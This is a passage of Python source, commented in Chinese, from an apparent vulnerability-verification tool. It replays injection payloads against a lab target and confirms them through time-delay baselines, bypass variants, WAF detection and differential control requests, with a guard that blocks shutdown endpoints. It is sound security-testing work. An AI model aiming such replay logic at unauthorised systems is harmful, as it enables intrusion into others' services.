        # 名注入源：trace 头本身是非标准 header，会抢走「首个非标准头」名额（见上方 _name_source
        # 注释）；此时不投 trace 头，canary 由「名注入头」进入应用、探针从 sink 实参侧识别，
        # 请求级关联仍成立。
        if taint_marker and not _name_source:
            headers[TRACE_HEADER] = taint_marker

        # 有些应用在 Filter 里校验这些头，缺了就直接 return / 403 —— 参数、编码、方法全对
        # 值由 A1 阶段 `filter_requirements` 从过滤器源码抽出，落在 spec 的
        # `required_headers`；这里只在「请求还没带这个头」时补，绝不覆盖 payload 注入的头。
        try:
            _rh = spec.get("required_headers")
            if not isinstance(_rh, dict):
                _rj = spec.get("raw_json")
                if isinstance(_rj, str) and _rj.strip().startswith("{"):
                    _rh = (json.loads(_rj) or {}).get("required_headers") or {}
                else:
                    _rh = {}
            for _hk, _hv in (_rh or {}).items():
                if _hk and str(_hk) not in headers and _hv:
                    headers[str(_hk)] = str(_hv)
        except Exception as _rhe:  # noqa: BLE001
            logger.debug("[D1.replay] required_headers 注入跳过：%s", _rhe)

        # 指向靶场自身的管理端点（/restart、/shutdown、/actuator/shutdown），请求路径本身却是
        # /ssrf 之类、看不出异常 —— 必须在真正投放前扫 URL/params/body，命中即拦，绝不投放。
        from src.iast.attack_context import guard_http_request
        _gg = guard_http_request(method, url, params=query, json_body=body)
        if _gg.get("blocked"):
            _note = _gg.get("note") or {}
            logger.warning("[destructive-guard] _replay_attack 拒绝投放（%s）：%s %s",
                           _note.get("category"), method, url)
            return DastImpact(error="blocked_by_destructive_guard: %s" % _note.get("reason", ""),
                              retried=0, provisional=True, slices=slices,
                              attack_degraded=bool(attack_degraded), target_unhealthy=False,
                              attack_payload_used="" if attack_degraded else str(primary_value)[:500],
                              payload_rejections=list(payload_rejections), payload_source=payload_source)

        # 重试 3 次 + 指数退避：瞬态 5xx / 连接异常 / 超时均重试。
        response = None
        retried = 0
        last_err = ""
        is_provisional = False
        elapsed_ms = 0.0  # 成功那一击的主请求耗时（毫秒），喂 D2 时延门
        # 时间盲注 sleep 型主载荷可能真的睡 sleep_seconds_hint 秒，超过默认 10s 超时会误判失败。
        # 给这类请求放宽超时到 sleep 秒数 + 8s 余量（含网络/处理），非 sleep 型维持 10s。
        req_timeout = 10 if sleep_seconds_hint <= 0 else max(10.0, sleep_seconds_hint + 8.0)
        # 决策2：multipart 回放（含认证态）。canary 作为文件字段内容投递；若端点受保护
        # （auth_context 带登录态 + csrf_token），把 CSRF 一并作为 multipart 表单字段补入，
        # 否则 Spring Security 会因缺 CSRF 直接 403 拒绝（此前 /file/upload 等永久 status=null）。
        _files: Optional[Dict[str, Any]] = None
        _mp_data: Optional[Dict[str, str]] = None
        if multipart_fields:
            # Paths.get(UPLOADED_FOLDER + getOriginalFilename) 的实参里没有任何身份段，
            # 探针钩到的 sink 事件无法归属到本 spec —— 626 靠同端点 path_traversal 的
            # 事件偶然确认、627 就丢了，表现为 file_upload 真值点忽明忽暗。
            # 把 taint_marker 的身份段带进文件名（纯字母数字，不含 ../，不改族语义），
            # 使 file_upload 每轮都能稳定拿到自己的 sink 事件。
            _fn_mark = re.sub(r"[^A-Za-z0-9_-]", "",
                              str(spec.get("taint_marker") or ""))[:32]
            _fn_suffix = ("_" + _fn_mark) if _fn_mark else ""
            _files = {pname: ("%s%s.txt" % (pname, _fn_suffix), pval,
                              "application/octet-stream")
                      for pname, pval in multipart_fields.items()}
            _csrf = auth_context.get("csrf_token") or ""
            if _csrf:
                _mp_data = {"_csrf": _csrf}
            if isinstance(body, dict) and body:
                _mp_data = {**(_mp_data or {}), **body}
        # 原样放进 Cookie 头会被容器判非法 → Spring 报 Missing cookie → 400 → 控制器不执行 → sink 0 事件。
        # 只替换非法字节，身份段 s4st41<16hex> 保持原样，I1 按身份段关联不受影响。
        if cookies:
            cookies = {k: sanitize_cookie_value(v) for k, v in cookies.items()}
        # 主路径出站报文 dump（与 _send_one 共用 _dump_outbound，保证观测口径一致）。
        # 只在重试循环外 dump 一次，避免同一请求记 3 行。
        try:
            _dump_final = requests.Request(
                method=str(method or "GET").upper(), url=str(url), params=query or None
            ).prepare().url
        except Exception:
            _dump_final = url
        _dump_outbound(method, url, _dump_final, query, headers, cookies, body,
                       content_type, _files)
        # 非 oracle 臂那部分就出自这里（_send_one 只是辅助发包，不是主重放入口）。
        _main_auth_state = "anonymous"
        for attempt in range(3):
            try:
                _data, _json = body_data_json(body, content_type)
                if _files:
                    _data, _json = _mp_data, None
                resp, _main_auth_state = self._guarded_request(
                    method=method,
                    url=url,
                    params=query or None,
                    headers=headers or None,
                    cookies=cookies,
                    data=_data,
                    json_body=_json,
                    files=_files,
                    timeout=req_timeout,
                    allow_redirects=False,
                )
                # 只记最后一次真实 HTTP 往返：重登耗时若混进 elapsed_ms，
                # 会被 D2 的时间盲注双阈值门读成假时延证据。
                _attempt_ms = float(getattr(self, "_guarded_request_ms", 0) or 0)
                if 500 <= int(resp.status_code) < 600:
                    last_err = f"transient 5xx: {resp.status_code}"
                    resp = None  # 瞬态 5xx 视为可重试
                else:
                    response = resp
                    elapsed_ms = _attempt_ms
                    last_err = ""
                    break
            except Exception as exc:
                last_err = str(exc)
                resp = None
            if resp is None and attempt < 2:
                retried += 1
                time.sleep(0.5 * (2 ** attempt))  # 0.5 / 1.0 / 2.0 s
        if response is None:
            # 重试 3 次仍失败 → provisional 交 I2 裁定（不自行判 ambiguous），闭环可重试。
            # 原实现无条件置 True，把「单次请求超时」「重复 5xx」也当成靶场不健康，是长期误标源
            # 详见 is_connection_level_failure 的 docstring。
            is_provisional = True
            _conn_down = is_connection_level_failure(last_err)
            if not _conn_down:
                logger.info(
                    "[D1.replay] %s %s 重试 3 次仍失败但非连接级（%s）→ 标 provisional，不置 target_unhealthy。",
                    method, endpoint, (last_err or "")[:120],
                )
            return DastImpact(error=last_err or "dast replay failed", retried=retried, provisional=is_provisional,
                              slices=slices, attack_degraded=bool(attack_degraded),
                              attack_payload_used="" if attack_degraded else str(primary_value)[:500],
                              target_unhealthy=bool(_conn_down),
                              payload_rejections=list(payload_rejections), payload_source=payload_source,
                              auth_state=_main_auth_state)

        text = response.text or ""

        # 命中 sleep 型主载荷时，对同端点发一次「结构完全相同、但 SLEEP(N)→SLEEP(0)」的对照请求，
        # 量出 baseline_elapsed_ms。D2 用 (elapsed_ms - baseline_elapsed_ms) 与 sleep 秒数做双阈值确认。
        # 经典时间盲注对照：只隔离 sleep 净效果，抗「换平凡值走到不同分支」的结构性噪声。
        # 约束：param_location=path 无法安全重建路径（占位符已被真值替换），跳过基线，D2 退回绝对阈值。
        baseline_elapsed_ms = 0.0
        if sleep_seconds_hint > 0.0:
            ploc0 = str(spec.get("param_location", "query")).lower()
            if ploc0 != "path" and param_name and is_valid_param_name(param_name):
                baseline_value = neutralize_sleep_payload(primary_value)
                b_query = dict(query)
                b_headers = dict(headers)
                b_cookies = dict(cookies)
                b_body = dict(body) if isinstance(body, dict) else body
                if ploc0 == "query":
                    b_query[param_name] = baseline_value
                elif ploc0 == "header":
                    b_headers[param_name] = baseline_value
                elif ploc0 == "cookie":
                    b_cookies[param_name] = baseline_value
                elif ploc0 in ("body", "form"):
                    if isinstance(b_body, dict):
                        b_body[param_name] = baseline_value
                    elif isinstance(b_body, str):
                        b_body = baseline_value
                try:
                    _tb0 = time.time()
                    _b_data, _b_json = body_data_json(b_body, content_type)
                    requests.request(
                        method=method,
                        url=url,
                        params=b_query or None,
                        headers=b_headers or None,
                        cookies=b_cookies or None,
                        data=_b_data,
                        json=_b_json,
                        timeout=10,
                        allow_redirects=False,
                    )
                    baseline_elapsed_ms = (time.time() - _tb0) * 1000.0
                except Exception as exc:
                    # 基线请求失败不影响主判定：D2 会因 baseline=0 退回绝对时延阈值。
                    logger.debug("[D1.replay] 时间盲注基线请求失败，D2 退回绝对时延阈值：%s", exc)
                    baseline_elapsed_ms = 0.0

        # D：抗抖动补投（探针完整性冲刺 D 块）。代码/命令注入、SQLi、XXE、反序列化一类 sink 在
        # 靶场承压或探针会话态抖动时偶尔漏报 SINK_REACHED——单次重放命中率低。对易抖动族，主请求
        # 成功后额外补投 1 次同 canary 回放（跨短冷却窗），提升 IAST 事件流捕获 SINK_REACHED 的概率；
        # canary 同值、请求幂等，不引入副作用，也不改变本次返回的 DastImpact（仍反映主请求）。
        _jit_fam = str(spec.get("family") or "").lower()
        if (_jit_fam and any(k in _jit_fam for k in
                ("inject", "command", "sql", "xxe", "deserial", "spel",
                 "ssti", "template", "expression", "ldap", "xpath", "code"))
                and response is not None and response.status_code < 500):
            try:
                time.sleep(0.4)  # 跨短冷却窗，规避探针会话态瞬时抖动
                if _files:
                    _h_data, _h_json = _mp_data, None
                else:
                    _h_data, _h_json = body_data_json(body, content_type)
                requests.request(
                    method=method, url=url, params=query or None, headers=headers or None,
                    cookies=cookies or None, data=_h_data, json=_h_json, files=_files,
                    timeout=req_timeout, allow_redirects=False,
                )
            except Exception as exc:
                logger.debug("[D1.replay] 抗抖动补投失败（忽略，主判定不受影响）：%s", exc)

        #   —— sink 只在 doPost、doPut 之类里，而 spec 记 GET；D1 按 spec 方法打过去，
        #   servlet 走的是「只种 cookie / 只转发」那条分支，sink 永不执行，表现为
        #   S2（canary 到应用但未到族 sink）。9 个「弱证据 TP」全部属此类。
        # 只在**源码能证明 sink 所在方法**时补投一次同参数请求（canary 不变 ⇒ I1 仍在同一
        # 身份段下归因，不产生新的 FP 通道）；最多补 1 个方法，控制请求数与幂等风险。
        try:
            from src.iast.source_infer import derive_method_augmentations as _derive_methods
            _aug_methods = _derive_methods(spec)[:1]
        except Exception as _sme:
            _aug_methods = []
            logger.debug("[D1.replay] 方法回退推导跳过：%s", _sme)
        if _aug_methods:
            _aug_m = _aug_methods[0]
            try:
                if _files:
                    _a_data, _a_json = _mp_data, None
                else:
                    _a_data, _a_json = body_data_json(body, content_type)
                _aug_resp = requests.request(
                    method=_aug_m, url=url, params=query or None, headers=headers or None,
                    cookies=cookies or None, data=_a_data, json=_a_json, files=_files,
                    timeout=req_timeout, allow_redirects=False,
                )
                logger.info(
                    "[D1.replay] 方法回退补投：%s → %s（源码证明 sink 在 do%s），status=%s",
                    method, _aug_m, _aug_m.title(), getattr(_aug_resp, "status_code", None),
                )
                try:
                    slices[f"method_fallback:{_aug_m}"] = {
                        "status_code": int(getattr(_aug_resp, "status_code", 0) or 0),
                        "body": str(getattr(_aug_resp, "text", "") or "")[:600],
                    }
                except Exception:
                    pass
            except Exception as exc:
                logger.debug("[D1.replay] 方法回退补投失败（忽略，主判定不受影响）：%s", exc)

        # M5：响应头下传。CRLF / 响应头注入族的结果点就是**响应头**，
        # 原先 _send_one 取到了 _resp_headers 但主重放这条构造路径没带上，
        # 结果点比对通道拿不到 headers → CRLF 恒判「无回显」。
        try:
            _main_resp_headers = dict(getattr(response, "headers", None) or {})
        except Exception:
            _main_resp_headers = {}
        dast_impact = DastImpact(
            reached=True,
            status_code=response.status_code,
            body=text[:2000],
            response_summary=f"status={response.status_code}; body={text[:300]}",
            headers=_main_resp_headers,
            retried=retried,
            provisional=False,
            auth_state=_main_auth_state,
            slices=slices,
            # 真实攻击元数据：I2 据此区分「真打过」与「只探过」，
            # 避免把可达性弱证据当成攻击证据（旧版 D2 把弱 payload 当验证成功即源于此）。
            attack_degraded=bool(attack_degraded),
            attack_payload_used="" if attack_degraded else str(primary_value)[:500],
            # 时间盲注承接三元组（同源）：D2 时延双阈值门的输入。非 sleep 型时 hint=0，D2 不启用该门。
            elapsed_ms=elapsed_ms,
            baseline_elapsed_ms=baseline_elapsed_ms,
            sleep_seconds_hint=sleep_seconds_hint,
            # ②-1：载荷形状自检留痕（被判废的载荷原因 + 实际投放的载荷来源）。
            payload_rejections=list(payload_rejections),
            payload_source=payload_source,
            # 缺口三：WAF/拦截器/参数截断 信号透传（保守检测，正常 200 不命中）。
            waf_blocked=self._is_waf_blocked(response.status_code, text, dict(response.headers)),
        )

        # 这是 I2 判因、闭环定向重放、净化器知识复用的共同数据源；
        # 此前这些信息只存在于 19MB 报告 JSON 的 dast_impact_evidence 里，跨轮读不到。
        try:
            _attempt_no = 1
            try:
                _attempt_no = int(spec.get("round") or 1)
            except Exception:
                _attempt_no = 1
            self._record_replay_attempt(
                spec=spec,
                method=method,
                url=url,
                param_name=str(param_name or ""),
                param_location=str(spec.get("param_location") or "query"),
                payload=("" if attack_degraded else str(primary_value or "")),
                encoding=str(payload_source or ""),
                content_type=str(content_type or ""),
                headers=headers,
                response=response,
                text=text,
                waf_blocked=bool(getattr(dast_impact, "waf_blocked", False)),
                elapsed_ms=int(elapsed_ms or 0),
                attempt_no=_attempt_no,
                auth_state=_main_auth_state,
            )
        except Exception as _ra_exc:
            logger.debug("[D1.replay] 重放尝试落库失败（忽略，不影响主流程）：%s", _ra_exc)

        # 但主路径只投 attack_payloads[0]。这里对第 2、3 个候选各补投一次，只做观测记录
        # （replay_attempts + slices），**不改变主判定** —— 是否算绕过成功交给后续 i2 LLM
        # 结合 read.state 判因，避免在重放层引入新的判定口径。
        # 上限 2 个候选（每 spec 最多 3 次请求），控制请求数与幂等风险。
        try:
            _probe_cands = [
                str(c) for c in (attack_payloads or [])[1:3]
                if c and str(c) != str(primary_value)
            ]
        except Exception:
            _probe_cands = []
        if _probe_cands:
            logger.info("[D1.replay] %s %s 追加投放 %d 个绕过变体（观测用，不改判定）",
                        method, endpoint, len(_probe_cands))
        for _pi, _pcand in enumerate(_probe_cands, start=2):
            try:
                _inject(param_name, spec.get("param_location", "query"), _pcand)
                if _files:
                    _p_data, _p_json = _mp_data, None
                else:
                    _p_data, _p_json = body_data_json(body, content_type)
                # /sqli/jdbc/vuln 补投撞登录墙 302 且无 auth_state 标记。统一走守卫，
                # 与主重放共享会话刷新，并把 auth_state 写进 action_json 供对账。
                _p_resp, _p_auth_state = self._guarded_request(
                    method=method, url=url, params=query or None, headers=headers or None,
                    cookies=cookies, data=_p_data, json_body=_p_json, files=_files,
                    timeout=req_timeout, allow_redirects=False,
                )
                _p_text = str(getattr(_p_resp, "text", "") or "")
                _p_hdrs = dict(getattr(_p_resp, "headers", None) or {})
                self._record_replay_attempt(
                    spec=spec,
                    method=method,
                    url=url,
                    param_name=str(param_name or ""),
                    param_location=str(spec.get("param_location") or "query"),
                    payload=_pcand,
                    encoding="bypass_variant",
                    content_type=str(content_type or ""),
                    headers=headers,
                    response=_p_resp,
                    text=_p_text,
                    waf_blocked=self._is_waf_blocked(getattr(_p_resp, "status_code", 0), _p_text, _p_hdrs),
                    elapsed_ms=0,
                    attempt_no=_pi,
                    auth_state=_p_auth_state,
                )
                try:
                    slices["bypass_probe:%d" % _pi] = {
                        "status_code": int(getattr(_p_resp, "status_code", 0) or 0),
                        "body": _p_text[:600],
                    }
                except Exception:
                    pass
            except Exception as _pe:
                logger.debug("[D1.replay] 绕过变体补投失败（忽略）：%s", _pe)
        if _probe_cands:
            # 还原主载荷注入：后续逻辑（响应构造、值级比对）仍以主值为准。
            try:
                _inject(param_name, spec.get("param_location", "query"), primary_value)
            except Exception:
                pass

        # 判「有没有产生效果」，而不是判「sink 里有没有 payload」：布尔对差分 / 时延 /
        # 文件内容签名 / 原样反射。全部是黑盒可观测量，**不依赖 IAST 探针** ⇒ 换靶场不失效、
        # 对象型 sink（FileInputStream/MessageDigest）也能定案。
        # 纪律：只做观测与落库（trigger_specs.oracle_state/oracle_signal），**不改主判定**；
        # 确认口径是否采信 oracle 由离线复核（scripts/oracle_report.py）决定后再接线。
        try:
            _orc_state = self._run_family_oracle(
                spec=spec, family=_spec_family, servlet_name=_servlet_name,
                param_name=str(param_name or ""),
                param_location=str(spec.get("param_location") or "query"),
                method=method, url=url, timeout=req_timeout, files=_files,
                content_type=str(content_type or ""), primary_value=str(primary_value or ""),
                baseline_ms=float(elapsed_ms or 0.0),
                inject=_inject, query=query, headers=headers, cookies=cookies, body=body,
            )
            if _orc_state is not None:
                dast_impact.oracle = _orc_state.get("verdict") or {}
                try:
                    slices["oracle"] = _orc_state.get("slices") or {}
                except Exception:
                    pass
                # 探测臂改写过 query/body/headers（且 body 为 None 时 _inject 会新建 dict 并
                # rebind 闭包变量），这里把主载荷重新注入一次，保证后续逻辑仍以主值为准。
                try:
                    _inject(param_name, spec.get("param_location", "query"), primary_value)
                except Exception:  # noqa: BLE001
                    pass
        except Exception as _oexc:  # noqa: BLE001
            logger.warning("[D1.replay][oracle] 采集异常（不影响主判定）：%s", _oexc)

        # 仅当目标对输入做编解码、明文 canary 无法直达 sink 时开启；基准靶场不编码输入，保持关闭避免 4 倍重放。
        if self._multi_form_enabled(spec):
            self._fire_multi_form_probes(
                spec, method, url, headers, cookies, query, body, content_type, param_name,
                str(spec.get("param_location") or "query"),
            )

        #  Phase 2 危害验证授权开关：默认仅 Phase 1；显式开关 + 白名单 + spec 含 impact_payloads 才打 Phase 2。
        if self._phase2_allowed(target, spec):
            phase2_results = self._send_phase2(method=method, url=url, headers=headers, cookies=cookies,
                                                query=query, body=body, content_type=content_type,
                                                spec=spec)
            for idx, res in enumerate(phase2_results):
                dast_impact.slices[f"phase2:{idx}"] = res

        # ===== D：多步重放（导入→触发）——把 poc_chain / prerequisites.ordered_steps 从文档变成执行序列 =====
        # 反序列化等「延迟处理」漏洞：主请求只是把载荷提交进存储/队列，真正的 sink 触发发生在后续
        # 请求（entry.trigger_route / ordered_steps 的第二步）。只打主请求 → sink 永远不被调用 → I1 arrival=0，
        # 表现为「D1 打不进去」。此处按 stage 顺序补发后续步骤，复用同一 canary 头（I1 按身份段关联），聚合进 dast_impact。
        followups = self._extract_followup_steps(spec)
        if followups:
            fu = self._send_followups(followups, base_url, headers, cookies, content_type, taint_marker)
            if fu:
                dast_impact.multi_step = True
                dast_impact.steps_executed = fu.get("count", 0)
                if fu.get("status_code") is not None:
                    dast_impact.followup_status_code = fu.get("status_code")
                if fu.get("body"):
                    dast_impact.body = (dast_impact.body or "") + "\n---followup---\n" + fu["body"][:1500]
                dast_impact.response_summary = (
                    (dast_impact.response_summary or "") + f"; multistep_followups={fu.get('count', 0)}"
                )
                # 后续步骤若触达了 sink（探针观测到），本次整体视为 reached，避免「主请求 200 但触发步未发」误判未达。
                if fu.get("reached"):
                    dast_impact.reached = True

        # ===== M7：两步重放（存储型写→读配对）=====
        # 存储型读取侧的参数里没有 canary（值是从库里读出来的），探针在该侧完全盲区，
        # 唯一通用证据是「我们投进去的自限标记在另一次请求的响应里被搜到」。
        # 只对本条 spec 配了 replay_plan 的跑；没配就是反射型/单次求值族，一步就够。
        if self._two_step_enabled(spec):
            try:
                _ts = self._replay_two_step(spec, target,
                                            auth_context=auth_context, accounts=_accounts)
            except Exception as _tse:
                logger.warning("[D1.replay] 两步重放失败（按无证据处理，不影响主重放结论）：%s", _tse)
                _ts = {"enabled": False, "error": str(_tse)}
            if _ts.get("enabled"):
                dast_impact.two_step = _ts
                dast_impact.response_summary = (
                    (dast_impact.response_summary or "")
                    + f"; two_step={_ts.get('read', {}).get('state') or 'absent'}"
                    f"@{_ts.get('read_endpoint_source') or 'none'}"
                )

        # 控制」对照请求，比对实验与控制的响应错误签名 / 标记回显 / 时延 / 结构相似度，产出 differential
        # 结论。严格 fail-open：任何异常 / 歧义 / 非目标族 / 路径位都不投 differential，绝不零化仅到达 TP。
        try:
            _diff = self._collect_differential(
                spec, method, url, headers, cookies, query, body, content_type,
                param_name, _files, req_timeout, response, text, elapsed_ms,
                taint_marker, primary_value)
            if isinstance(_diff, dict) and _diff.get("attempted"):
                dast_impact.differential = _diff
        except Exception as _de:
            # 不再吞到 debug：P1 对照是核心判据采集，失败必须可见，否则无法诊断「为什么没降级」。
            logger.warning("[D1.replay][P1-diff] 对照采集异常（fail-open 保留现状）：%s | url=%s fam=%s",
                           _de, url, str(spec.get("family") or ""))

        return dast_impact

    # ───────────────────────────── P1 对照实验差分采集 ─────────────────────────────
    _DIFF_FAMILY_FORCE = (
        "sqli", "sql_injection", "sql", "cmdi", "command_execution",
        "command_injection", "command", "rce", "code_injection", "pathtraver",
        "path_traversal", "path", "ldapi", "ldap_injection", "ldap", "xpath",
        "xpath_injection", "xpathi", "deser", "deserialization", "ssti", "template",
    )
    _DIFF_ERR_RE = None  # 延迟编译，避免模块加载期正则开销

    def _collect_differential(self, spec, method, url, headers, cookies, query, body,
                             content_type, param_name, files, req_timeout,
                             exp_response, exp_text, exp_elapsed, taint_marker,
                             primary_value=None):
        """P1 对照实验差分采集（保守 fail-open，且对 OWASP 安全/不安全用例可区分）。

        仅对 dataflow 族、且实验已到达时生效。发一次「裸 canary 无害控制」对照请求
        （canary 是字母数字串，任意注入上下文都 benign，不破坏语法、不执行命令），比较实验与控制的
        响应错误签名 / 标记回显 / 时延 / 结构相似度，调用 evidence_channels.differential_confirm 产出结论。

        （canary 也好、攻击载荷也好）原样回显/转义进响应体 —— 直接用原始 body 算相似度会恒 <0.95，
        导致所有对照都被判成 ambiguous_fail_open、永远不降级。这里在算相似度前把「控制值 _cv」
        与「实验值 primary_value」从两侧响应体里都剥掉，只比较「与参数值无关的结构」：
          - 安全用例忽略我们投的值 → 剥值后两侧结构一致 → similar=True → 高置信无差异 → 降级误报；
          - 不安全用例真的用我们的值产生命令输出/文件内容/SQL 报错 → 剥值后结构仍不一致 → 保留 TP。
        同时把对照请求失败（异常 / 5xx）从「静默 debug」升级为 WARNING，fail-open 纪律不变，但可诊断。

        安全纪律（绝不零化仅到达 TP）：
          - 只在「高置信无差异」（错误/标记/到达/时延一致且响应结构高度相似 >=0.95）时给 harmful=False（降级误报）；
          - 静默成功型真漏洞（响应内容变了但无报错、无裸标记回显）similar=False → fail-open 保留；
          - 任何异常 / 靶场 5xx / 歧义 → 返回 attempted=False（不投 differential，上游 fail-open 保留）。
        """
        from src.core.evidence_channels import differential_confirm
        from difflib import SequenceMatcher
        import re as _re
        _fam = str(spec.get("family") or "").lower().replace("-", "_").replace(" ", "_")
        if not any(k in _fam for k in self._DIFF_FAMILY_FORCE):
            return None
        if getattr(exp_response, "status_code", None) is None:
            return None  # 实验无响应 → 无对照意义
        if not param_name or not is_valid_param_name(param_name):
            return None
        _ploc = str(spec.get("param_location") or "query").lower()
        if _ploc == "path":
            return None  # 路径位无法安全重建无害控制值
        _cv = str(taint_marker or "")
        if not _cv:
            return None
        cq = dict(query); ch = dict(headers); ck = dict(cookies)
        cb = dict(body) if isinstance(body, dict) else body
        if _ploc == "query":
            cq[param_name] = _cv
        elif _ploc == "header":
            ch[param_name] = _cv
        elif _ploc == "cookie":
            ck[param_name] = _cv
        elif _ploc in ("body", "form") and isinstance(cb, dict):
            cb[param_name] = _cv
        else:
            return None
        try:
            _t0 = time.time()
            _c_data, _c_json = body_data_json(cb, content_type)
            _cresp = requests.request(
                method=method, url=url, params=cq or None, headers=ch or None,
                cookies=ck or None,
                data=_c_data,
                json=_c_json,
                files=files or None, timeout=req_timeout, allow_redirects=False)
            _cel = (time.time() - _t0) * 1000.0
            _ctext = _cresp.text or ""
        except Exception as _cre:
            logger.warning(
                "[D1.replay][P1-diff] 对照请求异常（fail-open 保留现状）：%s | %s %s fam=%s",
                _cre, method, url, _fam)
            return {"attempted": False, "harmful": False, "reason": "control_request_error"}
        if _cresp.status_code >= 500:
            logger.warning(
                "[D1.replay][P1-diff] 对照请求 5xx（fail-open 保留现状）：%s | %s %s fam=%s",
                _cresp.status_code, method, url, _fam)
            return {"attempted": False, "harmful": False, "reason": "control_5xx"}
        if self._DIFF_ERR_RE is None:
            self._DIFF_ERR_RE = _re.compile(
                r"(?i)(SQL\s*(syntax|exception|error)|java\.sql|CommunicationsException|"
                r"Command\s*(not found|line)|No such file or directory|ProcessBuilder|"
                r"java\.io\.FileNotFoundException|stack\s*trace|Exception in thread|"
                r"errorCode|ORA-\d+|SQLException|unterminated)")
        c_err = bool(self._DIFF_ERR_RE.search(_ctext))
        e_err = bool(self._DIFF_ERR_RE.search(exp_text or ""))
        c_marker = _cv in _ctext
        e_marker = _cv in (exp_text or "")
        # 剥值归一：把控制值 _cv 与实验值 primary_value 从两侧响应体都去掉，避免「参数值被回显」
        # 制造的人为不相似，让 safe 用例（忽略我们的值）在结构上与 control 一致 → 可降级。
        _pv = str(primary_value or "")
        def _strip(t):
            t = t or ""
            for _v in (_cv, _pv):
                if _v:
                    t = t.replace(_v, "")
            return t
        _ctext_n = _strip(_ctext)
        _etext_n = _strip(exp_text or "")
        _sim = SequenceMatcher(None, _ctext_n[:4000], _etext_n[:4000]).ratio() >= 0.95
        c_state = {"error_signature": c_err, "marker_seen": c_marker, "iast_reached": True,
                   "elapsed_ms": _cel, "status_code": _cresp.status_code, "similar": _sim}
        e_state = {"error_signature": e_err, "marker_seen": e_marker, "iast_reached": True,
                   "elapsed_ms": exp_elapsed,
                   "status_code": getattr(exp_response, "status_code", None), "similar": _sim}
        _out = differential_confirm(c_state, e_state, str(spec.get("family") or ""))
        logger.info(
            "[D1.replay][P1-diff] 对照完成 fam=%s attempted=%s harmful=%s reason=%s sim=%s",
            _fam, _out.get("attempted"), _out.get("harmful"), _out.get("reason"), _sim)
        return _out

    # ------------------------------------------------------------------ D：多步重放辅助 #
    def _extract_followup_steps(self, spec: Dict[str, Any]) -> List[Dict[str, str]]:
        """从 spec.raw_json 的 exploit_spec 提取主请求之后的多步重放步骤（导入→触发等）。

        支持两种来源：
          1. deserialization 的 entry.trigger_route（次级触发，GET 该路由唤起延迟处理）；
          2. prerequisites.ordered_steps 中形如 'POST /api/x submit ...' 的额外 HTTP 步骤。
        返回 [{method, route, note}, ...]（不含主步骤）。无则返回 []。
        """
        raw = spec.get("raw_json")
        if isinstance(raw, str):
            try:
                raw = json.loads(raw)
            except Exception:
                raw = None
        if not isinstance(raw, dict):
            return []
        es = raw.get("exploit_spec") or {}
        if not isinstance(es, dict):
            return []
        entry = es.get("entry") or {}
        steps: List[Dict[str, str]] = []
        trigger_route = str(entry.get("trigger_route") or "").strip()
        if trigger_route:
            steps.append({"method": "GET", "route": trigger_route, "note": "trigger secondary processing"})
        prereq = es.get("prerequisites") or {}
        if isinstance(prereq, dict):
            seen = {str(entry.get("route") or "").strip()}
            for s in (prereq.get("ordered_steps") or []):
                m = re.match(r"\s*(GET|POST|PUT|DELETE|PATCH)\s+(\S+)", str(s))
                if not m:
                    continue
                route = m.group(2).strip()
                if route in seen:
                    continue
                seen.add(route)
                steps.append({"method": m.group(1).upper(), "route": route, "note": str(s)[:120]})
        return steps

    def _send_followups(self, steps: List[Dict[str, str]], base_url: str, headers: Dict[str, str],
                        cookies: Dict[str, str], content_type: str, taint_marker: str) -> Dict[str, Any]:
        """按序补发后续步骤，复用同一 canary 头（I1 按身份段关联）。返回聚合结果 dict。"""
        from src.iast.attack_context import TRACE_HEADER, guard_http_request

        fu_status: Optional[int] = None
        fu_reached = False
        fu_body = ""
        count = 0
        base = base_url.rstrip("/") if base_url else ""
        for step in steps:
            method = str(step.get("method", "GET")).upper()
            route = str(step.get("route") or "").strip().lstrip("/")
            if not route:
                continue
            url = urljoin(base + "/", route) if base else ("/" + route)
            # ordered_steps 文本（LLM 产出，不可信），且此前是唯一一处绕过出站硬闸门的
            # 攻击者侧出站调用 —— 文本里若出现 /restart、/actuator/shutdown 之类生命周期端点
            _fg = guard_http_request(method, url)
            if _fg.get("blocked"):
                logger.error("[destructive-guard] _send_followups 拒绝投放（%s）：%s %s",
                             (_fg.get("note") or {}).get("category"), method, url)
                continue
            # 复用主请求的 headers（含 TRACE_HEADER=taint_marker）与 cookies/auth，保证 I1 同一身份段关联。
            step_headers = dict(headers or {})
            if taint_marker:
                step_headers[TRACE_HEADER] = taint_marker
            try:
                resp = requests.request(
                    method, url, headers=step_headers or None,
                    cookies=dict(cookies or {}), timeout=10, allow_redirects=False,
                )
                count += 1
                fu_status = int(resp.status_code)
                if 200 <= fu_status < 400:
                    fu_reached = True
                fu_body = (resp.text or "")[:1500]
                logger.info("[D1.followup] %s %s -> %s", method, route, fu_status)
            except Exception as exc:
                logger.warning("[D1.followup] %s %s 失败（跳过该步）：%s", method, route, exc)
        return {"count": count, "status_code": fu_status, "reached": fu_reached, "body": fu_body}

    def _encode_for_family(self, spec: Dict[str, Any], marker: str) -> str:
        """按 sink 家族对 canary 做预编码，规避应用侧解码前置导致的 sink 不可达。

        反序列化类 sink（family='deserialization' 或 exploit_spec 声明 encoding='base64'）：
        应用入口先 Base64.decode(data) 再 readObject。若注入字面 canary，decode 会因
        「非 4 的倍数 / 非法字符」抛异常，readObject 根本不被调用 → 探针无事件 → I1 arrival=0。
        故此处先 base64 编码 canary 再注入：decode 成功 → readObject 被调用 → 探针挂钩触发，
        由探针回带已注册身份段判定 arrival>0。其余 family 原样注入。
        """
        if not marker:
            return marker
        family = str(spec.get("family") or "").lower()
        enc = ""
        try:
            enc = str((spec.get("exploit_spec") or {}).get("payload", {}).get("encoding") or "").lower()
        except Exception:
            enc = ""
        need_b64 = family == "deserialization" or enc == "base64"
        if not need_b64:
            return marker
        try:
            # 标准 base64（带填充），与应用 Base64.getDecoder.decode 一致
            return base64.b64encode(marker.encode("utf-8")).decode("ascii")
        except Exception:
            return marker

    # ------------------------------------------------------------------ BOLA / RACE 运行时验证#
    def _send_one(self, method: str, url: str, query: Dict[str, str], headers: Dict[str, str],
                  cookies: Dict[str, str], body: Any, content_type: str,
                  files: Optional[Dict[str, Any]] = None) -> "DastImpact":
        """单次 HTTP 发送 + 瞬态重试（从 replay 抽出的复用件）。返回 DastImpact。

        破坏性路由的 id 参数换哨兵，保证任何构造路径都不会把真实资源 id 发出去。
        files：multipart/form-data 文件字段（决策2：认证态 multipart 回放），非空时以
        multipart 编码发送，data/json 不再使用。
        """
        from src.iast.orchestrator import DastImpact
        import time
